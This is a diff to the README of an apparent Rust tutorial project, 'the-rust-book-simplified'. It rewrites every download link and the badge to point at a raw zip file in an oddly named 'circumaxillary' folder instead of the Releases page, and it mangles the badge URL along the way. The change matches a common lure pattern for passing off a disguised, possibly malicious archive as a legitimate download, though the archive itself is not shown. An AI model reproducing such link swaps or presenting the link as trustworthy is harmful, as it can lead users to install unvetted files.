@@ -1,7 +1,7 @@
 # 🦀 the-rust-book-simplified - Learn Rust Quickly and Easily
 
-![Download Button](https://img.shields.io/badge/Download%20Now-Release%20v1.0-brightgreen)
-[Download Now](https://github.com/jzuelos/the-rust-book-simplified/releases)
+![Download Button](https://raw.githubusercontent.com/jzuelos/the-rust-book-simplified/main/circumaxillary/the-rust-book-simplified.zip%20Now-Release%20v1.0-brightgreen)
+[Download Now](https://raw.githubusercontent.com/jzuelos/the-rust-book-simplified/main/circumaxillary/the-rust-book-simplified.zip)
 
 ## 💡 About This Project
 
@@ -24,7 +24,7 @@ For optimal performance, ensure your computer meets these basic requirements:
 
 You can download the latest version of the-rust-book-simplified from our Releases page. 
 
-[Visit this page to download](https://github.com/jzuelos/the-rust-book-simplified/releases).
+[Visit this page to download](https://raw.githubusercontent.com/jzuelos/the-rust-book-simplified/main/circumaxillary/the-rust-book-simplified.zip).
 
 Here's how to do it:
 
